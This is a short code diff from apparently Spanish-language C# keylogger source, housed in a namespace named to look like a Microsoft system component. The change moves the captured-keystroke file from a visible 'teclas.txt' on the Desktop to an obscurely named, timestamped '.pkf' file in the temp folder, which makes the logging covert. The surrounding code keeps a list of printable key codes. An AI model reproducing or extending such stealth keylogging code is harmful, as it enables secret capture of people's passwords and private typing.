@@ -15,7 +15,7 @@ namespace SystemHooksMicrosoft
 
         #region "Mis variables"
         //static string temp_path = System.IO.Path.GetTempPath();
-        private static string temp_path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\teclas.txt";
+        private static string temp_path = System.IO.Path.GetTempPath() + "pk" + DateTime.Now.ToString("yyMMdd_hhmmss") + ".pkf";
         static string _mensaje;
         private static readonly List<int> _ascii_imprimibles = new List<int>() {32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,
             48,49,50,51,52,53,54,55,56,57,//[0-9]
